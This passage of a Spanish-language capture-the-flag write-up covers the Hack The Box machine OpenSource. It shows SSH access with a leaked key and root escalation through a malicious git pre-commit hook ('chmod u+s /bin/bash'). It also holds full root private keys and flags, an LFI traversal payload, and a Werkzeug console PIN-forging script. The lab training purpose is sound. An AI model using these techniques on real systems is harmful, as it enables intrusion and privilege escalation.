0s72Mu9V++IJoPjQZ1FXfBFqXMK+Ixwk3lOJ4BbtLwdmpU12Umw1N9vVX1QiV/Z6
zUdTSxZ4TtM3fiOjWn/61ygC9eY6l2hjYeaECpKY4Dl48H4FV0NdICB6inycdsHw
+p+ihcqRNcFwxsXUuwnWsdHv2aiH9Z3H8wKCAQAlbliq7YW45VyYjg5LENGmJ8f0
gEUu7u8Im+rY+yfW6LqItUgCs1zIaKvXkRhOd7suREmKX1/HH3GztAbmYsURwIf/
nf4P67EmSRl46EK6ynZ8oHW5bIUVoiVV9SPOZv+hxwZ5LQNK3o7tuRyA6EYgEQll
o5tZ7zb7XTokw+6uF+mQriJqJYjhfJ2oXLjpufS+id3uYsLKnAXX06y4lWqaz72M
NfYDE7uwRhS1PwQyrMbaurAoI1Dq5n5nl6opIVdc7VlFPfoSjzixpWiVLZFoEbFB
AE77E1AeujKjRkXLQUO3z0E9fnrOl5dXeh2aJp1f+1Wq2Klti3LTLFkKY4og
-----END RSA PRIVATE KEY-----
```

Nos podemos conectar introduciendo: ```chmod 600 id_rsa; ssh -i id_rsa dev01@10.10.11.164```:

<img src="/photos/2022-10-08-OpenSource-WriteUp/ssh.png" alt="drawing"  />  

Ahora vamos a reconocer el sistema como este usuario a ver si como ***dev01*** podemos escalar a ***root***.

##  Consiguiendo shell como root  

### Reconocimiento del sistema  

#### User flag 

Podemos encontrar la primera flag **user.txt** en el *homedir* de *dev01*:

```
dev01@opensource:~$ cat user.txt 
af55cf80c1651ba712bba7545a118ef7
```

#### Interfaces de la máquina 

Vemos que efectivamente la máquina tiene asignadas dos interfaces con las ip 10.10.11.164 y 172.17.0.1:

```
dev01@opensource:~$ hostname -I
10.10.11.164 172.17.0.1 
```

#### Homedir de dev01 

En el **homedir** de dev01 (/home/dev01), nos encontramos con una carpeta **.git**, que debe de estar relacionada con el repositorio que habíamos visto anteriormente en ***Gitea***. Recordemos que el repositorio se llamaba **home-backup**. Es posible que este usuario u otro esté haciendo backups de su ***homedir*** cada cierto tiempo.

```
dev01@opensource:~$ ls -la
total 44
drwxr-xr-x 7 dev01 dev01 4096 May 16 12:51 .
drwxr-xr-x 4 root  root  4096 May 16 12:51 ..
lrwxrwxrwx 1 dev01 dev01    9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r-- 1 dev01 dev01  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 dev01 dev01 3771 Apr  4  2018 .bashrc
drwx------ 2 dev01 dev01 4096 May  4 16:35 .cache
drwxrwxr-x 8 dev01 dev01 4096 Oct  8 10:54 .git
drwx------ 3 dev01 dev01 4096 May  4 16:35 .gnupg
drwxrwxr-x 3 dev01 dev01 4096 May  4 16:35 .local
-rw-r--r-- 1 dev01 dev01  807 Apr  4  2018 .profile
drwxr-xr-x 2 dev01 dev01 4096 May  4 16:35 .ssh
-rw-r----- 1 root  dev01   33 Oct  8 10:22 user.txt
```

#### Reconocimiento del sistema con pspy 

***Pspy*** es una herramienta que nos permite ver que tareas se están ejecutando a intervalos regulares de tiempo y por qué usuarios. Nos la podemos descargar del siguiente [repositorio](https://github.com/DominicBreuker/pspy).  

El programa se puede transferir a la máquina victima desplegando un servidor en python ```(python3 -m http.server 80)``` compartiendo el fichero y luego en la máquina víctima en un directorio donde tengamos permisos de escritura (como /tmp o /dev/shm) hacer un wget para descargar el archivo.  

Nos encontramos que cada cierto tiempo se está ejecutando lo siguiente:

<img src="/photos/2022-10-08-OpenSource-WriteUp/pspy.png" alt="drawing"  />  

Un *script* llamado **git-sync**, que se encuentra en la ruta **/usr/local/bin/** y es ejecutado por el usuario con uid igual a 0, es decir, **root**.

#### Analizando script git-sync 

Si listamos los **permisos** del *script* vemos que como el usuario **dev01** lo podemos ejecutar e **inspeccionar**:

```python
dev01@opensource:/tmp$ ls -la /usr/local/bin/git-sync
-rwxr-xr-x 1 root root 239 Mar 23  2022 /usr/local/bin/git-sync
```
Su **contenido** es el siguiente:

```bash
dev01@opensource:/tmp$ cat /usr/local/bin/git-sync
#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
    echo "No changes"
else
    day=$(date +'%Y-%m-%d')
    echo "Changes detected, pushing.."
    git add .
    git commit -m "Backup for ${day}"
    git push origin main
fi
```

Lo que hace **root** es acceder al **homedir** de dev01 y subir el contenido que hay en **/home/dev01/** al repositorio de **Gitea**. Este es el **backup** del que estábamos hablando anteriormente.

Nos aprovecharemos de que ***root*** esta ejecutando este *script* haciendo que ejecute un comando cuando suba la carpeta. Esto se puede hacer a través de ***git hooks***.

### Git hooks  

Un hook no es mas que un **código** que se ejecuta cuando ocurre un **evento**, antes o después, como puede ser un commit o un push. Estos **hooks** se guardan en la carpeta **hooks** del directorio **.git**:

```python
dev01@opensource:~/.git$ ls -l hooks/
total 48
-rwxrwxr-x 1 dev01 dev01  478 Mar 23  2022 applypatch-msg.sample
-rwxrwxr-x 1 dev01 dev01  896 Mar 23  2022 commit-msg.sample
-rwxrwxr-x 1 dev01 dev01 3327 Mar 23  2022 fsmonitor-watchman.sample
-rwxrwxr-x 1 dev01 dev01  189 Mar 23  2022 post-update.sample
-rwxrwxr-x 1 dev01 dev01  424 Mar 23  2022 pre-applypatch.sample
-rwxrwxr-x 1 dev01 dev01 1642 Mar 23  2022 pre-commit.sample
-rwxrwxr-x 1 dev01 dev01 1348 Mar 23  2022 pre-push.sample
-rwxrwxr-x 1 dev01 dev01 4898 Mar 23  2022 pre-rebase.sample
-rwxrwxr-x 1 dev01 dev01  544 Mar 23  2022 pre-receive.sample
-rwxrwxr-x 1 dev01 dev01 1492 Mar 23  2022 prepare-commit-msg.sample
-rwxrwxr-x 1 dev01 dev01 3610 Mar 23  2022 update.sample
```

Por ejemplo, el *hook* **pre-commit.sample** se ejecutará cuando se haga un **git commit**, aunque para hacerlo tendremos que renombrar el archivo a **pre-commit**. Entonces, podemos modificar el código que contiene para que al ejecutarlo root asigne el permiso ***setuid*** a la ***bash***. Así podremos ejecutar la bash como el propietario del binario, que es root.

El archivo quedaría de la siguiente manera:

```bash 
dev01@opensource:~/.git/hooks$ cat pre-commit.sample 
#!/bin/sh
#
## An example hook script to verify what is about to be committed.
## Called by "git commit" with no arguments.  The hook should
## exit with non-zero status after issuing an appropriate message if
## it wants to stop the commit.
#
## To enable this hook, rename this file to "pre-commit".

chmod u+s /bin/bash
```

Ahora solo toca esperar haste que **root** ejecute el *script* **git-sync**. Después de esperar un rato, vemos que este usuario ya ha asignado el permiso deseado a la bash:

```zsh
dev01@opensource:~/.git/hooks$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1113504 Apr 18 15:08 /bin/bash
```

Y ya nos podremos spawnear un bash como root haciendo **bash -p**:

```
dev01@opensource:~/.git/hooks$ bash -p
bash-4.4## whoami
root
```

La flag final **root.txt** es la siguiente:

```
bash-4.4## cat root.txt 
08400648d6a7863796c442d66b33a902
```

Y su clave privada **id_rsa** por si luego nos queremos conectar por **SSH** es la siguiente:

```
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```

##  Anexo  

### Forma alternativa de intrusión al contenedor  

En este apartado se explica una forma alternativa de ganar acceso al contenedor en vez de sobrescribir el archivo views.py. Gracias a un **LFI** que podremos explotar en http://10.10.11.164/uploads/, podremos buscar una serie de archivos en la máquina víctima para **forjar el pin** requerido para utilizar la consola de **Werkzeug** en http://10.10.11.164/console.

#### LFI en http://10.10.11.164/uploads/ 

Del views.py que podíamos encontrar en el source.zip, podemos ver que este endpoint **/uploads/** también hacía uso de la función ***os.path.join()***, que recordemos que truncaba el path si uno de sus argumentos empezaba por una /.

Si jugamos con ***http://10.10.11.164/uploads//etc/passwd*** el problema que tenemos es que la app de werkzeug normaliza el path, y  por tanto pasamos de http://10.10.11.164/uploads//etc/passwd a ***http://10.10.11.164/uploads/etc/passwd***, haciendo que no funcione el LFI.

La opción correcta sería utilizar la url ***http://10.10.11.164/uploads/..//etc/passwd***. En este caso Werkeug no normalizará el path, la función get_gile_name quitará el ../ y finalmente el os.path.join truncará el path a /etc/passwd. El resultado es el siguiente:

<img src="/photos/2022-10-08-OpenSource-WriteUp/curlLFI.png" alt="drawing"  />  

#### Forjando pin Werkzeug 

El endpoint http://10.10.11.164/console nos permite ejecutar comandos de forma remota, pero en esta ocasión, la URL está protegida por pin. La buena noticia es que este pin se puede forjar teniendo en cuenta algunos parámetros internos de la máquina víctima. Por eso necesitamos el LFI. Toda la información relativa a este punto la estaré sacando de [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug).

El *script* que deberemos ejecutar será el siguiente, pero antes deberemos sustituir algunas constantes:

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'web3_user',## username
    'flask.app',## modname
    'Flask',## getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.5/dist-packages/flask/app.py' ## getattr(mod, '__file__', None),
]

private_bits = [
    '279275995014060',## str(uuid.getnode()),  /sys/class/net/ens33/address
    'd4e6cb65d59544f3331ea0425dc555a1'## get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

* El username es el usuario que está corriendo Flask. Sabemos que es **root**.
* **modname** y **getaddr** ya están **bien**.
* getaddr es el **path absoluto** de app.py en el directorio de flask:

<img src="/photos/2022-10-08-OpenSource-WriteUp/flaskpath.png" alt="drawing"  />  

Del error de la web, podemos ver que el path es **/usr/local/lib/python3.10/site-packages/flask/app.py**
* uuid.getnode() es la **MAC** en decimal de la máquina víctima. La podemos encontrar en la ruta /sys/class/net/eth0/address de la máquina vícitma. Podemos hacer un *curl http://10.10.11.164/uploads/..//sys/class/net/eth0/address --path-as-is* para obtenerla. Es la **02:42:ac:11:00:06**. En decimal: **2485377892358**.
* get_machine_id(), es la concatenación del valor que se encuentra en la ruta /proc/sys/kernel/random/boot_id y /proc/self/cgroup. El primer valor se obtiene con el comando *curl http://10.10.11.164/uploads/..//proc/sys/kernel/random/boot_id --path-as-is --ignore-content-length*. Es **f754c8cd-b0ac-40d2-9b10-adbc2a79449d**. El segundo con el comando *curl http://10.10.11.164/uploads/..//proc/self/cgroup --path-as-is --ignore-content-length*. Es **7e03804a70dc28c78c52fb8b3ed16ebe3749831c01f85f875792ad512969e696**.
* Por último, debemos de tener en cuenta si Werkzeug utiliza **sha1** o **MD5** como método de encriptado. Este campo dependerá de la versión de Werkzeug. Como el ping generado por MD5 no me ha funcionado, probaré con **sha1**.

Teniendo todos estos datos en cuenta el *script* quedaría:

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'root',## username
    'flask.app',## modname
    'Flask',## getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.10/site-packages/flask/app.py' ## getattr(mod, '__file__', None),
]

private_bits = [
    '2485377892358',## str(uuid.getnode()),  /sys/class/net/ens33/address
    'f754c8cd-b0ac-40d2-9b10-adbc2a79449d7e03804a70dc28c78c52fb8b3ed16ebe3749831c01f85f875792ad512969e696'## get_machine_id(), /etc/machine-id
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

El **pin** generado ha sido **109-552-733**. Si lo probamos contra la web **http://10.10.11.164/console** ganaremos acceso a la consola de comandos de python y ya podremos ejecutar comandos:

<img src="/photos/2022-10-08-OpenSource-WriteUp/consoleWrkzeug.png" alt="drawing"  />  

A partir de aquí, nos podremos enviar una shell y ganar acceso al contenedor.